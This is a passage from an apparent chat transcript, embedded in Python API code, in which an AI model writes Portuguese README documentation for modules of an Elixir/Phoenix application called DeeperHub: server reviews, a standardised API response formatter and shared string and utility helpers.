*   `DeeperHub.Accounts`: Para associar reviews a usuários.
*   `DeeperHub.Auth` / `DeeperHub.RBAC`: Para verificar permissões de edição/exclusão.
*   `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`: Para sanitizar conteúdo.
*   `DeeperHub.ServerReviews.RateLimitIntegration`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## 🤝 9. Como Usar / Integração

*   **Módulo `DeeperHub.Servers`:**
    *   Ao exibir detalhes de um servidor, pode chamar `ServerReviews.list_reviews_by_server/2` e `ServerReviews.get_server_rating_average/1`.
*   **Interface do Usuário (Frontend/API):**
    *   Fornecer formulários para `create_review` e `update_review`.
    *   Exibir listas de reviews e a média de rating.
    *   Permitir que usuários reajam a reviews.
*   **Painel de Moderação:**
    *   Listar reviews sinalizadas ou todas as reviews com opções de filtro.
    *   Permitir que moderadores editem/ocultem/excluam reviews.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de reviews, incluindo validações.
*   Testar a lógica de permissão (autor vs. outros usuários vs. moderadores).
*   Testar o cálculo e atualização da média de rating do servidor.
*   Testar a sanitização de conteúdo.
*   Testar a paginação e ordenação da listagem de reviews.
*   Testar a funcionalidade de reações.
*   Localização: `test/deeper_hub/server_reviews/`.

### 10.2. Métricas

*   `deeper_hub.server_reviews.created.count` (tags: `server_id`, `rating_value`)
*   `deeper_hub.server_reviews.updated.count`
*   `deeper_hub.server_reviews.deleted.count` (tags: `deleted_by_role` (`author`, `moderator`))
*   `deeper_hub.server_reviews.reactions.count` (tags: `review_id`, `reaction_type`)
*   `deeper_hub.server_reviews.average_rating.updated.count` (tags: `server_id`)
*   `deeper_hub.server_reviews.content_sanitized.count`

### 10.3. Logs

*   **Nível INFO:** Nova review criada/atualizada/excluída. Média de rating recalculada.
*   **Nível WARNING:** Tentativa não autorizada de editar/excluir review. Conteúdo de review sinalizado para moderação.
*   **Nível ERROR:** Falha ao persistir review ou atualizar média de rating.

### 10.4. Telemetria

*   `[:deeper_hub, :server_reviews, :review, :created | :updated | :deleted]`
    *   Metadados: `%{review_id: id, server_id: id, user_id: id, rating: val}`
*   `[:deeper_hub, :server_reviews, :server, :rating_recalculated]`
    *   Metadados: `%{server_id: id, new_average_rating: avg, review_count: count}`
*   `[:deeper_hub, :server_reviews, :reaction, :added]`
    *   Metadados: `%{review_id: id, user_id: id, type: type}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação ao criar/atualizar review retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.
*   Tentativas de operar em reviews/servidores não existentes retornam `{:error, :not_found}`.

## 🛡️ 12. Considerações de Segurança

*   **Sanitização de Conteúdo:** Essencial para prevenir XSS em títulos e comentários de reviews.
*   **Prevenção de Spam/Abuso:** Rate limiting para submissão de reviews. Captcha pode ser necessário se o abuso for alto.
*   **Manipulação de Rating:** Detectar e mitigar tentativas de manipulação de classificação (ex: múltiplas contas falsas avaliando o mesmo servidor). `FraudDetection` pode ajudar.
*   **Privacidade do Autor:** Considerar se as reviews devem ser anônimas ou vinculadas ao perfil do usuário, e como isso afeta a privacidade.

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de cálculo da média de rating eficiente e correta.
*   Garanta que as verificações de permissão sejam robustas.
*   Considere o impacto na performance ao adicionar novos filtros ou ordenações na listagem de reviews.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"review mais útil\" baseado em votos da comunidade.
*   [ ] Permitir que proprietários de servidores respondam publicamente às reviews.
*   [ ] Adicionar análise de sentimento às reviews para extrair insights.
*   [ ] Permitir que usuários filtrem reviews por idioma.
*   [ ] Implementar um sistema de \"review verificada\" para jogadores que comprovadamente jogaram no servidor (ex: através de integração com o jogo ou tempo de jogo).
*   [ ] Opção para usuários reportarem reviews como úteis, spam, ou abusivas. (Já mencionado, mas reforçar).

---

*Última atualização: 2025-05-12*

---

Este README do `ServerReviews` cobre os aspectos centrais.

O que gostaria de detalhar em seguida? Poderíamos continuar com os \"submódulos de serviço\" como `ServerPackages`, `ServerEvents`, ou mudar para um módulo Core diferente como `DeeperHub.Core.BackgroundTaskManager` (que já começamos)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já documentamos o `DeeperHub.Core.BackgroundTaskManager`.

Vamos então para outro módulo Core que é fundamental para a interação da aplicação com o mundo externo e para a consistência interna: `DeeperHub.Core.APIResponder`. Ele garante que todas as respostas da API sigam um padrão, facilitando a vida dos desenvolvedores de frontend e de integrações.

---

# Módulo: `DeeperHub.Core.APIResponder` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.APIResponder`

O módulo `DeeperHub.Core.APIResponder` é um componente utilitário central no DeeperHub, responsável por **padronizar a estrutura e o formato de todas as respostas HTTP da API REST**. Ele fornece um conjunto de funções para gerar respostas JSON consistentes para diferentes cenários, incluindo sucessos, erros de aplicação, erros de validação e outras condições.

Ao centralizar a formatação de respostas, o `APIResponder` garante que os clientes da API (frontends, aplicativos móveis, serviços de terceiros) recebam dados de uma maneira previsível e fácil de consumir, melhorando a experiência de integração e reduzindo a complexidade no tratamento de respostas no lado do cliente. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Formatação de Respostas de Sucesso (`format_success/3`):**
    *   Envelopar os dados de sucesso em uma estrutura JSON padrão, incluindo um status (`\"success\"`), os dados principais (`data`), uma mensagem opcional e metadados opcionais (ex: para paginação).
*   **Formatação de Respostas de Erro (`format_error/3`):**
    *   Gerar respostas de erro estruturadas, incluindo um status (`\"error\"`), um motivo ou código de erro, detalhes adicionais e uma mensagem descritiva.
    *   Mapear diferentes tipos de erro internos para códigos de status HTTP apropriados (`error_to_http_status/1`).
*   **Formatação de Erros de Validação (`format_validation_error/2`):**
    *   Formatar especificamente erros de validação (ex: de Ecto.Changesets) em uma estrutura clara que detalhe os campos e as mensagens de erro.
*   **Consistência de Estrutura JSON:**
    *   Garantir que todas as respostas da API sigam um esquema JSON comum (ex: `{\"status\": \"...\", \"data\": ..., \"error\": ..., \"message\": ..., \"meta\": ...}`).
*   **Codificação e Decodificação JSON (Opcional, ou delegação):**
    *   Fornecer funções utilitárias para codificar termos Elixir para JSON (`encode/2`, `encode!/2`) e decodificar JSON para termos Elixir (`decode/2`, `decode!/2`), embora isso possa ser delegado a bibliotecas como `Jason` diretamente nos controllers. A inclusão aqui seria por conveniência e padronização de opções.
*   **Suporte a Padrões de API (Opcional):**
    *   Facilitar a conformidade com padrões de API como JSON:API, se adotado pelo projeto, embora a estrutura padrão descrita seja mais simples.
*   **Integração com Controllers Phoenix:**
    *   Ser facilmente utilizável pelos controllers Phoenix para enviar respostas HTTP (ex: `json(conn, APIResponder.format_success(data))`).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.APIResponder` (Módulo Funcional):**
    *   **Responsabilidade:** Contém todas as funções públicas para formatação de respostas.
    *   É stateless e suas funções são puras (dado os mesmos inputs, produzem os mesmos outputs), exceto pela possível geração de timestamps.
    *   **Interações:**
        *   Pode utilizar uma biblioteca JSON como `Jason` internamente para codificação (se essa funcionalidade for incluída aqui).
        *   Pode consultar `DeeperHub.Core.ConfigManager` para formatos de data/hora padrão ou outras preferências de formatação de resposta.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/api_responder.ex  # Contém todas as funções de formatação
```
Este módulo é tipicamente simples e autocontido, não necessitando de uma estrutura de diretórios complexa, GenServers ou supervisores.

### 3.3. Decisões de Design Importantes

*   **Estrutura de Resposta Padrão:** Definir uma estrutura JSON clara e consistente para todas as respostas. Uma sugestão comum é:
    ```json
    // Sucesso
    {
      \"status\": \"success\", // ou um código HTTP numérico como 200, 201
      \"data\": { /* dados principais */ },
      \"message\": \"Operação realizada com sucesso.\", // opcional
      \"meta\": { \"pagination\": { /* ... */ } } // opcional
    }

    // Erro
    {
      \"status\": \"error\", // ou um código HTTP numérico como 400, 404, 500
      \"error\": {
        \"code\": \"ERROR_CODE_INTERNAL\", // um código de erro da aplicação
        \"message\": \"Uma descrição do erro.\",
        \"details\": { /* informações adicionais sobre o erro, ex: campos de validação */ }
      },
      \"data\": null,
      \"message\": \"Uma descrição do erro.\", // pode ser o mesmo que error.message
      \"meta\": null
    }
    ```
*   **Mensagens de Erro Claras:** Mensagens de erro devem ser úteis para o desenvolvedor que consome a API, mas não devem vazar informações sensíveis do sistema.
*   **Códigos de Status HTTP:** Usar códigos de status HTTP semanticamente corretos é fundamental. O `APIResponder` pode ajudar a mapear erros internos para esses códigos.
*   **Internacionalização (i18n) de Mensagens:** Mensagens de erro e sucesso podem precisar ser traduzidas. O `APIResponder` pode integrar com `DeeperHub.Core.Internationalization` para isso.

## 🛠️ 4. Casos de Uso Principais

*   **Controller Retorna uma Lista de Recursos:**
    *   `UserController` busca uma lista de usuários.
    *   Chama `APIResponder.format_success(list_of_users_maps, \"Usuários listados com sucesso.\", %{total: count})`.
    *   Envia a resposta JSON resultante com status 200.
*   **Controller Cria um Novo Recurso:**
    *   `ServerController` cria um novo servidor.
    *   Chama `APIResponder.format_success(new_server_map, \"Servidor criado com sucesso.\")`.
    *   Envia a resposta JSON resultante com status 201 Created.
*   **Controller Lida com um Erro de Validação:**
    *   `AccountService` retorna `{:error, changeset}`.
    *   Controller chama `APIResponder.format_validation_error(changeset.errors, \"Dados inválidos fornecidos.\")`.
    *   Envia a resposta JSON resultante com status 422 Unprocessable Entity.
*   **Controller Lida com Recurso Não Encontrado:**
    *   `ServerService` retorna `{:error, :not_found}`.
    *   Controller chama `APIResponder.format_error(:not_found, \"O servidor solicitado não existe.\")`.
    *   Determina o status HTTP (404) e envia a resposta.
*   **Controller Lida com Erro Interno:**
    *   Ocorre uma exceção inesperada. Um Plug de tratamento de exceções captura a exceção.
    *   O Plug chama `APIResponder.format_error(:internal_server_error, \"Ocorreu um erro inesperado. Tente novamente mais tarde.\")`.
    *   Envia a resposta JSON com status 500.

## 🌊 5. Fluxos Importantes

### Fluxo de Formatação de Resposta de Sucesso em um Controller Phoenix

1.  **Serviço de Domínio:** Retorna dados para o controller (ex: `{:ok, user_data_map}`).
2.  **Controller:**
    *   Recebe `user_data_map`.
    *   Prepara metadados de paginação, se aplicável.
    *   Chama `formatted_response_body = DeeperHub.Core.APIResponder.format_success(user_data_map, \"Usuário recuperado.\", pagination_meta)`.
    *   Usa a função `json/2` do Phoenix: `json(conn |> put_status(200), formatted_response_body)`.
3.  **Phoenix/Plug:** Serializa `formatted_response_body` para JSON e envia a resposta HTTP.

### Fluxo de Formatação de Resposta de Erro de Validação

1.  **Serviço de Domínio:** Tenta criar/atualizar um recurso e o changeset Ecto é inválido. Retorna `{:error, changeset}`.
2.  **Controller:**
    *   Recebe `{:error, changeset}`.
    *   Extrai os erros: `errors = Ecto.Changeset.traverse_errors(changeset, & MyAppWeb.ErrorHelpers.translate_error/1)`.
    *   Chama `formatted_error_body = DeeperHub.Core.APIResponder.format_validation_error(errors, \"Por favor, corrija os erros indicados.\")`.
    *   Chama `status_code = DeeperHub.Core.APIResponder.error_to_http_status(:validation_error)` (que retornaria 422).
    *   Usa `json(conn |> put_status(status_code), formatted_error_body)`.
3.  **Phoenix/Plug:** Envia a resposta.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original, com ênfase na estrutura de resposta unificada)*

### 6.1. `DeeperHub.Core.APIResponder.format_success(data :: term(), message :: String.t() | nil, meta :: map() | nil) :: map()`

*   **Descrição:** Formata uma resposta de sucesso.
*   **Retorno:** Mapa estruturado para sucesso (ex: `%{status: \"success\", data: data, message: message, meta: meta}`).

### 6.2. `DeeperHub.Core.APIResponder.format_error(error_code :: atom() | String.t(), details :: term() | nil, user_message :: String.t() | nil) :: map()`

*   **Descrição:** Formata uma resposta de erro genérica.
*   **`error_code`:** Um código de erro interno da aplicação (ex: `:resource_not_found`, `\"AUTH_002\"`).
*   **`details`:** Informações técnicas adicionais sobre o erro (evitar vazar dados sensíveis).
*   **`user_message`:** Mensagem amigável para o usuário. Se `nil`, uma mensagem padrão pode ser derivada do `error_code`.
*   **Retorno:** Mapa estruturado para erro (ex: `%{status: \"error\", error: %{code: error_code, message: user_message, details: details}}`).

### 6.3. `DeeperHub.Core.APIResponder.format_validation_error(errors :: map() | list(), user_message :: String.t() | nil) :: map()`

*   **Descrição:** Formata uma resposta específica para erros de validação.
*   **`errors`:** Mapa de erros (ex: `%{field_name: [\"error message\"]}`) ou lista de strings de erro.
*   **Retorno:** Mapa estruturado para erro de validação (ex: `%{status: \"error\", error: %{code: \"VALIDATION_ERROR\", message: user_message, fields: errors_map}}`).

### 6.4. `DeeperHub.Core.APIResponder.error_to_http_status(error_code :: atom() | String.t()) :: integer()`

*   **Descrição:** Mapeia um código de erro interno da aplicação para um código de status HTTP apropriado.
*   **Exemplo:** `:not_found` -> `404`, `:unauthenticated` -> `401`, `:unauthorized` -> `403`, `:validation_error` -> `422`, `:internal_server_error` -> `500`.

### 6.5. `DeeperHub.Core.APIResponder.encode(data :: term(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}` (Opcional)

*   **Descrição:** Wrapper para `Jason.encode/2` com opções padrão do sistema.

### 6.6. `DeeperHub.Core.APIResponder.decode(json_string :: String.t(), opts :: keyword()) :: {:ok, term()} | {:error, term()}` (Opcional)

*   **Descrição:** Wrapper para `Jason.decode/2` com opções padrão do sistema.

## ⚙️ 7. Configuração

Geralmente, este módulo tem poucas configurações diretas, mas pode depender de:

*   `[:core, :api_responder, :default_error_message]` (String): Mensagem de erro padrão se nenhuma específica for fornecida.
*   `[:core, :api_responder, :include_trace_id_in_errors]` (Boolean): Se o `trace_id` (de `DistributedTracing`) deve ser incluído automaticamente em respostas de erro para facilitar a correlação. (Padrão: `false` para prod, `true` para dev).
*   `[:core, :internationalization, :default_locale]` (String): Usado se as mensagens de erro/sucesso forem traduzidas.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.Internationalization` (opcional): Se as mensagens forem traduzidas.
*   `DeeperHub.Core.ConfigManager` (opcional): Para obter configurações de formatação.

### 8.2. Bibliotecas Externas

*   `Jason` (ou outra biblioteca JSON): Se as funções `encode/decode` forem implementadas aqui. Caso contrário, os controllers usariam `Jason` diretamente.

## 🤝 9. Como Usar / Integração

Os controllers Phoenix são os principais consumidores deste módulo.

**Exemplo em um Controller Phoenix:**
```elixir
defmodule DeeperHubWeb.API.V1.UserController do
  use DeeperHubWeb, :controller
  alias DeeperHub.Core.APIResponder
  alias DeeperHub.Accounts

  action_fallback DeeperHubWeb.API.FallbackController # Para tratamento centralizado de erros não capturados

  def show(conn, %{\"id\" => id}) do
    case Accounts.get_user(id) do
      {:ok, nil} ->
        conn
        |> put_status(APIResponder.error_to_http_status(:not_found))
        |> json(APIResponder.format_error(:not_found, nil, \"Usuário não encontrado.\"))
      {:ok, user} ->
        # Poderia haver uma função para transformar a struct User em um mapa seguro para API
        user_map_for_api = MyApp.UserView.render(\"show.json\", %{user: user}) 
        json(conn, APIResponder.format_success(user_map_for_api, \"Usuário recuperado.\"))
      {:error, reason} ->
        conn
        |> put_status(APIResponder.error_to_http_status(:internal_error))
        |> json(APIResponder.format_error(:internal_error, reason, \"Erro ao buscar usuário.\"))
    end
  end

  def create(conn, %{\"user\" => user_params}) do
    case Accounts.create_user(user_params) do
      {:ok, user} ->
        user_map_for_api = MyApp.UserView.render(\"show.json\", %{user: user})
        conn
        |> put_status(:created) # 201
        |> json(APIResponder.format_success(user_map_for_api, \"Usuário criado com sucesso.\"))
      {:error, changeset} ->
        errors = Ecto.Changeset.traverse_errors(changeset, &MyAppWeb.ErrorHelpers.translate_error/1)
        conn
        |> put_status(APIResponder.error_to_http_status(:validation_error)) # 422
        |> json(APIResponder.format_validation_error(errors, \"Falha na validação.\"))
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função de formatação (`format_success`, `format_error`, `format_validation_error`) com diferentes inputs para garantir que a estrutura JSON de saída seja a esperada.
*   Testar a função `error_to_http_status` com vários códigos de erro.
*   Se as funções `encode/decode` estiverem aqui, testá-las.
*   Localização: `test/deeper_hub/core/api_responder_test.exs`.

### 10.2. Métricas

Este módulo em si geralmente não gera muitas métricas, pois é um utilitário de formatação. As métricas relevantes (taxa de erro da API, status codes) seriam geradas pelo `DeeperHub.API` ou pelos Plugs de HTTP.

### 10.3. Logs

Normalmente, o `APIResponder` não faz logging direto. Os controllers ou o `FallbackController` seriam responsáveis por logar os erros antes de chamar o `APIResponder` para formatar a resposta.

### 10.4. Telemetria

Não aplicável diretamente para um módulo de formatação puro. A telemetria estaria associada ao ciclo de vida da requisição HTTP.

## ❌ 11. Tratamento de Erros

*   As funções de formatação devem ser robustas e não falhar mesmo com entradas inesperadas (ex: `nil` para `data` em `format_success`). Elas devem retornar uma estrutura de erro válida ou uma representação padrão.
*   Falhas na codificação JSON (se feitas aqui) devem ser tratadas e logadas.

## 🛡️ 12. Considerações de Segurança

*   **Não Vazar Informações Sensíveis:** A principal consideração é garantir que as funções `format_error` e `format_validation_error` *não* incluam informações sensíveis do sistema (como stack traces, queries SQL, ou valores de variáveis internas) nas respostas enviadas ao cliente em ambiente de produção. A chave `:details` em `format_error` deve ser usada com cautela.
*   **Consistência:** Manter a estrutura de resposta consistente ajuda a evitar que invasores tentem adivinhar informações com base em variações no formato de erro.

## 🧑‍💻 13. Contribuição

*   Mantenha a estrutura de resposta JSON bem definida e documentada.
*   Ao adicionar novos códigos de erro internos, atualize `error_to_http_status/1` se necessário.
*   Considere a internacionalização das mensagens de usuário.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte mais explícito para o padrão JSON:API se for uma direção desejada para a API.
*   [ ] Integrar mais profundamente com `DeeperHub.Core.Internationalization` para que `user_message` possa ser um código de tradução.
*   [ ] Fornecer uma maneira de configurar a estrutura de resposta padrão (ex: chaves `status`, `data`, `error`) através do `ConfigManager` para maior flexibilidade.
*   [ ] Criar helpers Phoenix para os controllers que combinem a formatação da resposta e o envio da mesma (ex: `respond_success(conn, data, status_code \\\\ 200)`).

---

*Última atualização: 2025-05-12*

---

Este módulo é mais um utilitário, mas fundamental para a experiência do desenvolvedor que consome a API.

Próximo? Que tal `DeeperHub.Shared.Utils` para agruparmos os utilitários gerais, ou prefere um módulo de domínio como `DeeperHub.Accounts` (que já começamos) ou `DeeperHub.UserProfiles` (mencionado na documentação original)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos agrupar e detalhar os utilitários genéricos que podem ser usados em toda a aplicação sob um namespace `DeeperHub.Shared.Utils`. A documentação original listou vários (`DateUtils`, `FileUtils`, `ListUtils`, `MapUtils`, `SecurityUtils`, `StringUtils`, `ValidationUtils`).

Criaremos um README \"guarda-chuva\" para `DeeperHub.Shared.Utils` e, em seguida, podemos detalhar cada um deles como se fossem submódulos ou arquivos dentro desse contexto. Para este exercício, vou criar um README para o módulo `DeeperHub.Shared.Utils` como um todo, mencionando seus componentes, e depois detalhar um deles, por exemplo, `DeeperHub.Shared.Utils.StringUtils`.

---

# Módulo: `DeeperHub.Shared.Utils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils`

O módulo (ou namespace) `DeeperHub.Shared.Utils` agrupa um conjunto de **módulos utilitários genéricos** que fornecem funções auxiliares para tarefas comuns em todo o sistema DeeperHub. Essas funções não pertencem a um domínio de negócio específico, mas oferecem funcionalidades reutilizáveis para manipulação de strings, datas, listas, mapas, arquivos, validações básicas e operações de segurança comuns.

O objetivo é evitar a duplicação de código, promover a consistência e fornecer um local centralizado para funcionalidades de baixo nível que são amplamente utilizadas. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave (por Submódulo)

Este namespace normalmente contém vários módulos menores, cada um com um foco específico:

*   **`DeeperHub.Shared.Utils.StringUtils`:**
    *   Manipulação de strings: conversão de case (camelCase, snake_case), truncamento, mascaramento de IDs, geração de IDs/tokens simples, formatação para logs.
*   **`DeeperHub.Shared.Utils.DateUtils`:**
    *   Manipulação de datas e horas: adição/subtração de tempo, cálculo de diferenças, formatação, verificação de intervalos.
*   **`DeeperHub.Shared.Utils.ListUtils`:**
    *   Operações em listas: chunking, diff, group_by, interleave, paginação em memória, particionamento, ordenação por múltiplas chaves, remoção de duplicatas.
*   **`DeeperHub.Shared.Utils.MapUtils`:**
    *   Operações em mapas: conversão de chaves (átomo/string), compactação (remoção de nils), mesclagem profunda, filtragem, acesso/atualização aninhada.
*   **`DeeperHub.Shared.Utils.FileUtils` (se a aplicação lida diretamente com o sistema de arquivos):**
    *   Operações de arquivo: verificação de existência, leitura, escrita, cópia, cálculo de hash, obtenção de MIME type.
*   **`DeeperHub.Shared.Utils.ValidationUtils`:**
    *   Funções de validação de formato para dados comuns: email, telefone, URL, data, número de documento, JSON.
    *   Validação de complexidade de senha (básica), presença de campos obrigatórios.
    *(Nota: Validações mais complexas ou específicas de domínio residiriam nos respectivos módulos ou em `Core.InputValidator`)*
*   **`DeeperHub.Shared.Utils.SecurityUtils`:**
    *   Utilitários de segurança genéricos e agnósticos de contexto: geração de tokens/IDs aleatórios seguros, hashing de senhas (se não centralizado em `Auth` ou `Core.EncryptionService`), avaliação de risco simples baseada em fatores.
    *(Nota: Funções criptográficas mais robustas e gerenciamento de chaves devem estar em `Core.EncryptionService`)*

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

Cada submódulo dentro de `DeeperHub.Shared.Utils` é tipicamente um **módulo funcional puro**, contendo apenas funções que recebem entradas e produzem saídas sem efeitos colaterais (ou com efeitos colaterais bem definidos, como no caso de `FileUtils`). Eles geralmente não mantêm estado nem são GenServers.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/shared/utils/
├── string_utils.ex
├── date_utils.ex
├── list_utils.ex
├── map_utils.ex
├── file_utils.ex       # Se aplicável
├── validation_utils.ex
└── security_utils.ex
```
O arquivo `lib/deeper_hub/shared/utils.ex` poderia ser um arquivo vazio ou um módulo que simplesmente agrupa aliases ou documentação de alto nível para os submódulos.

### 3.3. Decisões de Design Importantes

*   **Sem Estado:** Os módulos utilitários devem ser, na medida do possível, stateless.
*   **Funções Puras:** Preferir funções puras para facilitar o teste e o raciocínio sobre o código.
*   **Sem Dependências de Domínio:** Utilitários não devem depender de módulos de domínio específicos (ex: `DeeperHub.Accounts`). Se uma função precisa de lógica de domínio, ela provavelmente pertence ao módulo de domínio.
*   **Generalidade:** As funções devem ser genéricas o suficiente para serem úteis em múltiplos contextos.
*   **Clareza vs. Performance:** Embora a performance seja importante, a clareza e a correção das funções utilitárias são primordiais. Otimizações podem ser feitas se um utilitário específico se tornar um gargalo.

## 🛠️ 4. Casos de Uso Principais (Exemplos de cada Submódulo)

*   **`StringUtils.camel_to_snake(\"myExampleVariable\")`** -> `\"my_example_variable\"`
*   **`DateUtils.add(~N[2023-01-01 10:00:00], 5, :day)`** -> `~N[2023-01-06 10:00:00]`
*   **`ListUtils.chunk([1,2,3,4,5], 2)`** -> `[[1,2], [3,4], [5]]`
*   **`MapUtils.deep_merge(%{a: 1, b: %{c: 2}}, %{b: %{d: 3}, e: 4})`** -> `%{a: 1, b: %{c: 2, d: 3}, e: 4}`
*   **`ValidationUtils.validate_email(\"test@example.com\")`** -> `true` (ou `{:ok, \"test@example.com\"}`)
*   **`SecurityUtils.generate_token(16, :hex)`** -> Uma string hexadecimal de 32 caracteres.

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado ou processos. O fluxo é simplesmente a chamada de uma função e o retorno de seu resultado.

## 📡 6. API (Funções Públicas dos Submódulos)

A API consiste nas funções públicas exportadas por cada submódulo utilitário (ex: `StringUtils.truncate/3`, `MapUtils.get_in_path/3`). A documentação específica de cada API residiria nos arquivos README de seus respectivos submódulos ou diretamente como documentação de função `@doc` / `@spec`.

## ⚙️ 7. Configuração

Geralmente, módulos utilitários puros não requerem muita configuração externa via `ConfigManager`, a menos que tenham comportamentos padrão que precisem ser ajustáveis (ex: o caractere de mascaramento padrão em `StringUtils.mask_id/3`).

## 🔗 8. Dependências

### 8.1. Módulos Internos

Idealmente, os módulos em `Shared.Utils` têm poucas ou nenhuma dependência de outros módulos `DeeperHub`, exceto talvez `Core.ConfigManager` para padrões configuráveis. Eles são blocos de construção.

### 8.2. Bibliotecas Externas

Podem usar bibliotecas Elixir/Erlang padrão para suas funcionalidades (ex: `String`, `Enum`, `Map`, `DateTime`, `:crypto`). Em alguns casos, uma pequena biblioteca de terceiros altamente focada pode ser usada se fornecer uma funcionalidade utilitária robusta que não valha a pena reinventar (ex: uma biblioteca para parsing de User-Agent mais avançado, se isso for colocado em `Utils` em vez de um serviço dedicado).

## 🤝 9. Como Usar / Integração

Os módulos utilitários são importados ou aliasados e suas funções são chamadas diretamente onde necessário.

```elixir
defmodule MyApp.SomeService do
  alias DeeperHub.Shared.Utils.StringUtils
  alias DeeperHub.Shared.Utils.DateUtils

  def process_text(text) do
    truncated = StringUtils.truncate(text, 100)
    # ...
  end

  def get_expiry_date(start_date) do
    DateUtils.add(start_date, 30, :day)
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Cada função utilitária deve ter testes unitários abrangentes cobrindo casos de borda, entradas válidas e inválidas.
*   Testes baseados em propriedades (Property-based testing com StreamData) podem ser muito úteis para funções utilitárias que processam dados.
*   Localização: `test/deeper_hub/shared/utils/<submodule_name>_test.exs`.

### 10.2. Métricas

Geralmente, funções utilitárias puras não emitem métricas por si mesmas. Se uma função utilitária for identificada como um gargalo de performance em um caminho crítico, o chamador dessa função seria responsável por adicionar métricas de timing ao redor da chamada.

### 10.3. Logs

Funções utilitárias puras geralmente não devem fazer logging. Se ocorrer um erro inesperado dentro de uma função utilitária (o que deveria ser raro se as entradas forem validadas pelos chamadores ou pela própria função), ela pode levantar uma exceção que será capturada e logada pelo chamador.

### 10.4. Telemetria

Similar às métricas, funções utilitárias puras não emitem eventos Telemetry. A instrumentação Telemetry ocorreria no código que as utiliza.

## ❌ 11. Tratamento de Erros

*   Funções utilitárias devem ter um contrato claro sobre como lidam com entradas inválidas:
    *   Algumas podem levantar exceções (ex: `ArgumentError`).
    *   Outras podem retornar tuplas de erro (ex: `{:error, :invalid_format}`).
    *   Outras podem retornar um valor padrão ou `nil`.
*   A documentação de cada função deve ser clara sobre seu comportamento em caso de erro.

## 🛡️ 12. Considerações de Segurança

*   **`SecurityUtils`:** As funções aqui devem ser revisadas cuidadosamente para garantir que sejam criptograficamente seguras (ex: uso correto de `:crypto.strong_rand_bytes/1`).
*   **`ValidationUtils` e `StringUtils` (Sanitização):** Se alguma função aqui realizar sanitização, ela deve ser robusta contra bypass. No entanto, a sanitização principal para XSS, SQLi, etc., reside nos módulos de segurança dedicados (`XssProtection`, `SqlInjectionProtection`). Os utilitários podem fornecer blocos de construção básicos para essas operações.
*   **`FileUtils`:** Se interagir com o sistema de arquivos, deve ser extremamente cuidadoso para não introduzir vulnerabilidades de Path Traversal (essa proteção principal estaria em `PathTraversalProtection`, mas `FileUtils` deve ser consciente).

## 🧑‍💻 13. Contribuição

*   Ao adicionar uma nova função utilitária, certifique-se de que ela seja genérica e reutilizável.
*   Adicione documentação clara (`@doc`, `@spec`) e testes unitários completos.
*   Evite adicionar dependências desnecessárias a outros módulos do DeeperHub.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Para cada submódulo (`StringUtils`, `DateUtils`, etc.), criar um arquivo README.md específico detalhando sua API.
*   [ ] Avaliar se alguma funcionalidade em `Utils` se tornou complexa o suficiente para justificar seu próprio serviço/módulo Core.
*   [ ] Adicionar mais utilitários conforme a necessidade surgir (ex: `NumberUtils` para formatação de moeda, `EnumUtils` para operações avançadas em enumerações).

---

*Última atualização: 2025-05-12*

---

Agora, vamos detalhar um desses submódulos. Que tal o `DeeperHub.Shared.Utils.StringUtils`?

---

# Módulo: `DeeperHub.Shared.Utils.StringUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.StringUtils`

O módulo `DeeperHub.Shared.Utils.StringUtils` fornece um conjunto de funções utilitárias para **manipulação e formatação de strings**. Estas funções são genéricas e projetadas para serem usadas em várias partes do sistema DeeperHub para tarefas comuns como conversão de case, truncamento, mascaramento de IDs, e geração de identificadores simples. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Conversão de Case:**
    *   Converter strings entre `snake_case` e `camelCase` (`camel_to_snake/1`, `snake_to_camel/1`).
*   **Truncamento de Texto:**
    *   Limitar o comprimento de uma string, adicionando um sufixo se truncada (`truncate/3`).
*   **Mascaramento de IDs/Dados Sensíveis:**
    *   Ocultar parcialmente uma string (ex: um ID ou número), deixando apenas alguns caracteres visíveis (`mask_id/3`).
*   **Geração de Identificadores Simples:**
    *   Gerar strings de ID aleatórias, possivelmente com um prefixo (`generate_id/1`). (Nota: Para IDs criptograficamente seguros ou UUIDs, usar `DeeperHub.Shared.Utils.SecurityUtils` ou `UUID`).
*   **Formatação para Logs:**
    *   Formatar/truncar texto para exibição segura e concisa em logs (`format_for_log/2`).
*   **Outras Manipulações Comuns:**
    *   Remoção de acentos.
    *   Geração de \"slugs\" a partir de títulos.
    *   Capitalização.

## 🏗️ 3. Arquitetura e Design

Este é um módulo puramente funcional, não gerenciando estado.

### 3.1. Componentes Principais

